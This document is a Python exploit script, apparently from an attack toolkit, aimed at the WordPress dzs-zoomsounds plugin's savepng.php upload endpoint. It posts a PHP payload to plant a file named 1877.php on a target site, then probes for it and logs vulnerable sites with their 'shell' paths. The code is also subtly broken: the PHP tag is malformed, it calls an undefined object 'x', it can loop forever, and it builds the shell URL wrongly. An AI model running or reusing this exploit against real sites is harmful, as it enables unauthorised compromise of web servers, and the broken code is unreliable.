import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")



def exploit(url):
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url

    found = []
    req = request(url)
    try:
        listaa = [
            '/wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php']
        for script in listaa:
            url = (url+script)
            while True:
                req_first = req.get(url)
                if "error:http raw post data does not exist" in req_first.text:
                    shell = '<php echo "POC By ENG Yazeed"'
                    req.post(url,  data=shell, timeout=45)
                    possible_shell = f"{url}/wp-content/plugins/dzs-zoomsounds/1877.php"
                    req_second = x.get(possible_shell)
                    if "POC By ENG Yazeed" in req_second.text:
                        print(colors.yellow +
                              "[+] ==> Zoomsounds %s Vulnerable" % url)
                        found.append({
                            "url": url,
                            "type": "Zoomsounds RCE",
                            "status": "Vulnerable",
                            "shell": possible_shell,
                        })
                        json_me(found)
                    else:
                        print(colors.red +
                              "[-] Zoomsounds ==> %s Not Vulnerable" % url)

                else:
                    print(colors.red +
                          "[-] Zoomsounds ==> %s Not Vulnerable" % url)
                    break
    except Exception as e:
        print(e)
        pass




